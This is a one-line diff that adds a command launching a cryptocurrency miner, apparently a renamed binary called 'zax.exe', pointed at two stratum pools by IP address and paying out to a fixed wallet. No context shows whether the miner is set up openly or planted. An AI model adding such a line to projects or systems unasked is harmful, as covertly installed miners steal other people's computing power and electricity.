@@ -1,0 +1,1 @@
+zax.exe -rvram 1 -pool stratum+tcp://172.65.223.147:3353 -pool2 stratum+tcp://172.65.200.133:3353 -ewal 33kJvAUL3Na2ifFDGmUPsZLTyDUBGZLhAi.zfpzfwug3ggdjzb -esm 3 -allpools 1 -allcoins 0
